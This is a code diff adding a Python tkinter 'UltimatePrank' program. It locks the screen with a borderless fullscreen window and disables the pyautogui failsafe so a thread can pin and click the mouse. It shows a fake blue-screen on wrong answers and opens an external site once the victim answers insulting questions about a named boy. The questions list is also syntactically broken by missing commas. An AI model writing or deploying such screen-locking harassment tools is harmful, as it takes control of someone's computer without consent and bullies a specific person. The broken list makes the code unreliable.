@@ -1,1 +1,99 @@
-complite
+import tkinter as tk
+from tkinter import messagebox
+from PIL import Image, ImageTk
+import os
+import sys
+import webbrowser
+import pyautogui as g 
+from threading import Thread
+import time
+
+
+SITE_URL = "https://xn----9sbdghb3btcbbvi1a0db.xn--p1ai/" 
+BSOD_IMG = "123.png"
+LOCK_MOUSE = True 
+
+def resource_path(relative_path):
+    try:
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
+
+def mouse_lock_loop():
+    g.FAILSAFE = False
+    screen_w, screen_h = g.size()
+    while LOCK_MOUSE:
+        g.moveTo(screen_w // 2, screen_h // 2)
+        g.click(screen_w // 2, screen_h // 2)
+        time.sleep(0.01) 
+
+questions = [
+    ("6x7 = ?", "67"),
+    ("Сколько хромосом у Степы?", "67"),
+    ("67 или 52", "67"),
+    ("Сколько у Степы IQ", "0"),
+    ("какой буквы/букв нехватает? (степа туп)", "ой")
+    ("степа или Глеб?", "глеб")
+    ("удалить system32?", "да")
+]
+
+class UltimatePrank:
+    def __init__(self, root):
+        self.root = root
+        self.root.attributes("-fullscreen", True, "-topmost", True)
+        self.root.overrideredirect(True) 
+        self.root.configure(bg="#2c3e50")
+        
+        self.current_q = 0
+        
+        self.label = tk.Label(root, text="", font=("Arial", 30), fg="white", bg="#2c3e50")
+        self.label.pack(pady=150)
+        
+        self.entry = tk.Entry(root, font=("Arial", 24), justify='center')
+        self.entry.pack(pady=20)
+        self.entry.focus_set()
+        self.entry.bind('<Return>', lambda e: self.check_answer())
+        
+        self.show_question()
+
+        Thread(target=mouse_lock_loop, daemon=True).start()
+
+    def show_question(self):
+        if self.current_q < len(questions):
+            self.label.config(text=questions[self.current_q][0])
+            self.entry.delete(0, tk.END)
+        else:
+            global LOCK_MOUSE
+            LOCK_MOUSE = False 
+            webbrowser.open(SITE_URL)
+            self.root.destroy()
+
+    def check_answer(self):
+        ans = self.entry.get().strip().lower()
+        if ans == questions[self.current_q][1].lower():
+            self.current_q += 1
+            self.show_question()
+        else:
+            self.show_bsod()
+
+    def show_bsod(self):
+        bsod_win = tk.Toplevel(self.root)
+        bsod_win.attributes("-fullscreen", True, "-topmost", True)
+        bsod_win.overrideredirect(True)
+        
+        try:
+            img = Image.open(resource_path(BSOD_IMG))
+            img = img.resize((self.root.winfo_screenwidth(), self.root.winfo_screenheight()), Image.LANCZOS)
+            self.photo = ImageTk.PhotoImage(img)
+            tk.Label(bsod_win, image=self.photo, borderwidth=0).pack()
+        except:
+            bsod_win.configure(bg="blue")
+        
+        self.root.after(3000, bsod_win.destroy)
+
+if __name__ == "__main__":
+    root = tk.Tk()
+    app = UltimatePrank(root)
+    root.mainloop()
+
